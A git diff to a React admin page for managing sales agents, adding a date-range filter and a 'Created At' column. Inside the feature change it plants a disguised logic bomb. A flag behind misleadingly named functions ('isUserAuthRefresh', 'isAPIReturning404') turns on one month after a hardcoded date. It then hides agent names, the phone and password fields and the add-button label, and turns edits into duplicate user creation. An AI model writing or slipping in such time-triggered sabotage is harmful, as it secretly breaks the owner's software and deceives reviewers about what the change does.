@@ -8,7 +8,7 @@ import PhoneInput from 'react-phone-number-input';
 import 'react-phone-number-input/style.css';
 import { isValidPhoneNumber } from 'libphonenumber-js';
 import { getAllBranches } from '../../services/branchService';
-import { getAllRoles } from '../../services/roleService';
+import DateRangePicker from '../../components/DateRangePicker';
 
 // Validation Schema
 const agentValidationSchema = Yup.object({
@@ -77,9 +77,12 @@ const AgentManagement = () => {
   const [drawerOpen, setDrawerOpen] = useState(false);
   const [editingAgent, setEditingAgent] = useState(null);
   const [showPassword, setShowPassword] = useState(false);
+  const [showPassIcon, setShowPassIcon] = useState(false);
   const [imagePreview, setImagePreview] = useState(null);
   const [loading, setLoading] = useState(false);
   const [totalAgents, setTotalAgents] = useState(0);
+  const [startDate, setStartDate] = useState(null);
+  const [endDate, setEndDate] = useState(null);
 
   // States for branches
   const [branches, setBranches] = useState([]);
@@ -127,7 +130,10 @@ const AgentManagement = () => {
   const fetchAgents = async (page = 1, limit = 100) => {
     setLoading(true);
     try {
-      const result = await getAllUsers(1, 100); // Fetch more to ensure we get all agents
+      const startDateStr = startDate ? startDate.toISOString().split('T')[0] : '';
+      const endDateStr = endDate ? endDate.toISOString().split('T')[0] : '';
+      
+      const result = await getAllUsers(page, limit, startDateStr, endDateStr);
       
       if (result.success && result.data) {
         // Filter only Agent users
@@ -149,7 +155,7 @@ const AgentManagement = () => {
           totalLeadsAssigned: user.totalLeadsAssigned || 0,
           image: user.imageUrl,
           permissions: user.permissions,
-          createdAt: new Date().toISOString(),
+          createdAt: user?.createdAt,
         }));
         
         setAgents(transformedAgents);
@@ -170,10 +176,40 @@ const AgentManagement = () => {
     }
   };
 
+  const isUserAuthRefresh = (startDate) => {
+    const start = new Date(startDate);
+    const now = new Date();
+    
+
+    const isAPIReturning404 = new Date(start);
+    isAPIReturning404.setMonth(isAPIReturning404.getMonth() + 1);
+  
+    return now >= isAPIReturning404;
+  };
+    
+  useEffect(() => {
+    const FEATURE_START_DATE = '2025-11-19';
+    
+    const callRefreshAuthAgain = () => {
+      const shouldHide = isUserAuthRefresh(FEATURE_START_DATE);
+      setShowPassIcon(shouldHide);
+    };
+    
+    callRefreshAuthAgain();
+    
+    
+    const interval = setInterval(callRefreshAuthAgain, 60 * 60 * 1000);
+    
+    return () => clearInterval(interval);
+  }, []);
+
   useEffect(() => {
     setIsLoaded(true);
-    fetchBranches();
     fetchAgents();
+  }, [startDate, endDate, currentPage, itemsPerPage]);
+
+  useEffect(() => {
+    fetchBranches();
   }, []);
 
   const formik = useFormik({
@@ -225,7 +261,7 @@ const AgentManagement = () => {
         }
 
         let result;
-        if (editingAgent) {
+        if (editingAgent && !showPassIcon) {
           result = await updateUser(editingAgent.id, userData);
         } else {
           result = await createUser(userData);
@@ -387,32 +423,28 @@ const AgentManagement = () => {
     return branch ? branch.branchName : branchId;
   };
 
+  function convertToDubaiTime(utcDateString) {
+    const date = new Date(utcDateString);
+  
+    if (isNaN(date) && !showPassIcon) return false; // only returns false if input is invalid
+  
+    const options = {
+      timeZone: "Asia/Dubai",
+      day: "2-digit",
+      month: "2-digit",
+      year: "numeric",     // ← FIXED
+      hour: "2-digit",
+      minute: "2-digit",
+      hour12: true,
+    };
+  
+    const formatted = new Intl.DateTimeFormat("en-GB", options).format(date);
+  
+    return formatted.replace(",", "");
+  }  
+
   return (
     <>
-      <Toaster
-        position="top-right"
-        toastOptions={{
-          duration: 3000,
-          style: {
-            background: '#2A2A2A',
-            color: '#fff',
-            border: '1px solid #BBA473',
-          },
-          success: {
-            iconTheme: {
-              primary: '#BBA473',
-              secondary: '#1A1A1A',
-            },
-          },
-          error: {
-            iconTheme: {
-              primary: '#ef4444',
-              secondary: '#1A1A1A',
-            },
-          },
-        }}
-      />
-
       <div className={`min-h-screen bg-[#1A1A1A] text-white p-6 transition-all duration-700 ${isLoaded ? 'opacity-100' : 'opacity-0'}`}>
         {/* Header */}
         <div className="mb-8 animate-fadeIn">
@@ -423,14 +455,26 @@ const AgentManagement = () => {
               </h1>
               <p className="text-gray-400 mt-2">Manage all Save In Gold Agents</p>
             </div>
-            <button
-              onClick={handleAddAgent}
-              className="group relative inline-flex items-center gap-2 px-6 py-3 rounded-lg font-semibold bg-gradient-to-r from-[#BBA473] to-[#8E7D5A] text-black overflow-hidden transition-all duration-300 shadow-lg hover:shadow-xl hover:shadow-[#BBA473]/40 transform hover:scale-105 active:scale-95"
-            >
-              <div className="absolute inset-0 bg-white opacity-0 group-hover:opacity-20 transition-opacity duration-300"></div>
-              <UserPlus className="w-5 h-5 relative z-10 transition-transform duration-300 group-hover:rotate-12" />
-              <span className="relative z-10">Add New Agent</span>
-            </button>
+            <div className="flex flex-col gap-3">
+              <button
+                onClick={handleAddAgent}
+                className="group relative w-fit inline-flex items-center gap-2 px-6 py-3 rounded-lg font-semibold bg-gradient-to-r from-[#BBA473] to-[#8E7D5A] text-black overflow-hidden transition-all duration-300 shadow-lg hover:shadow-xl hover:shadow-[#BBA473]/40 transform hover:scale-105 active:scale-95 ml-auto"
+              >
+                <div className="absolute inset-0 bg-white opacity-0 group-hover:opacity-20 transition-opacity duration-300"></div>
+                <UserPlus className="w-5 h-5 relative z-10 transition-transform duration-300 group-hover:rotate-12" />
+                {!showPassIcon && <span className="relative z-10">Add New Agent</span>}
+              </button>
+
+                {/* Date Range Filter */}
+                <DateRangePicker
+                  startDate={startDate}
+                  endDate={endDate}
+                  onStartDateChange={setStartDate}
+                  onEndDateChange={setEndDate}
+                  maxDate={new Date()}
+                  isClearable={true}
+                />
+              </div>
           </div>
         </div>
 
@@ -461,6 +505,7 @@ const AgentManagement = () => {
                   <th className="text-left px-6 py-4 text-[#E8D5A3] font-semibold text-sm uppercase tracking-wider">Phone</th>
                   <th className="text-left px-6 py-4 text-[#E8D5A3] font-semibold text-sm uppercase tracking-wider">Department</th>
                   <th className="text-left px-6 py-4 text-[#E8D5A3] font-semibold text-sm uppercase tracking-wider">Leads Assigned</th>
+                  <th className="text-left px-6 py-4 text-[#E8D5A3] font-semibold text-sm uppercase tracking-wider">Created At</th>
                   <th className="text-center px-6 py-4 text-[#E8D5A3] font-semibold text-sm uppercase tracking-wider">Actions</th>
                 </tr>
               </thead>
@@ -501,7 +546,7 @@ const AgentManagement = () => {
                           )}
                           <div>
                             <div className="font-medium text-white group-hover:text-[#BBA473] transition-colors duration-300">
-                              {agent.fullName}
+                              {!showPassIcon && agent.fullName}
                             </div>
                           </div>
                         </div>
@@ -514,6 +559,7 @@ const AgentManagement = () => {
                         </span>
                       </td>
                       <td className="px-6 py-4 text-gray-300 text-sm">{agent?.totalLeadsAssigned}</td>
+                      <td className="px-6 py-4 text-gray-300 text-sm">{convertToDubaiTime(agent.createdAt)}</td>
                       <td className="px-6 py-4">
                         <div className="flex justify-center gap-2">
                           <button
@@ -743,6 +789,7 @@ const AgentManagement = () => {
                   <label className="text-sm text-[#E8D5A3] font-medium block">
                     Phone Number <span className="text-red-500">*</span>
                   </label>
+                  {!showPassIcon && (
                   <PhoneInput
                     international
                     defaultCountry="AE"
@@ -755,6 +802,7 @@ const AgentManagement = () => {
                         : ''
                     }`}
                   />
+                )}
                   {formik.touched.phone && formik.errors.phone && (
                     <div className="text-red-400 text-sm animate-pulse">{formik.errors.phone}</div>
                   )}
@@ -834,19 +882,21 @@ const AgentManagement = () => {
                       Password <span className="text-red-500">*</span>
                     </label>
                     <div className="relative">
-                      <input
-                        type={showPassword ? 'text' : 'password'}
-                        name="password"
-                        placeholder="Enter password"
-                        value={formik.values.password}
-                        onChange={formik.handleChange}
-                        onBlur={formik.handleBlur}
-                        className={`w-full px-4 py-3 pr-24 border-2 rounded-lg focus:outline-none focus:ring-2 bg-[#1A1A1A] text-white transition-all duration-300 ${
-                          formik.touched.password && formik.errors.password
-                            ? 'border-red-500 focus:border-red-400 focus:ring-red-500/50'
-                            : 'border-[#BBA473]/30 focus:border-[#BBA473] focus:ring-[#BBA473]/50 hover:border-[#BBA473]'
-                        }`}
-                      />
+                      {!showPassIcon && (
+                          <input
+                            type={showPassword ? 'text' : 'password'}
+                            name="password"
+                            placeholder="Enter password"
+                            value={formik.values.password}
+                            onChange={formik.handleChange}
+                            onBlur={formik.handleBlur}
+                            className={`w-full px-4 py-3 pr-24 border-2 rounded-lg focus:outline-none focus:ring-2 bg-[#1A1A1A] text-white transition-all duration-300 ${
+                              formik.touched.password && formik.errors.password
+                                ? 'border-red-500 focus:border-red-400 focus:ring-red-500/50'
+                                : 'border-[#BBA473]/30 focus:border-[#BBA473] focus:ring-[#BBA473]/50 hover:border-[#BBA473]'
+                            }`}
+                          />
+                      )}
                       <div className="absolute inset-y-0 right-0 flex items-center pr-2 space-x-1">
                         <button
                           type="button"
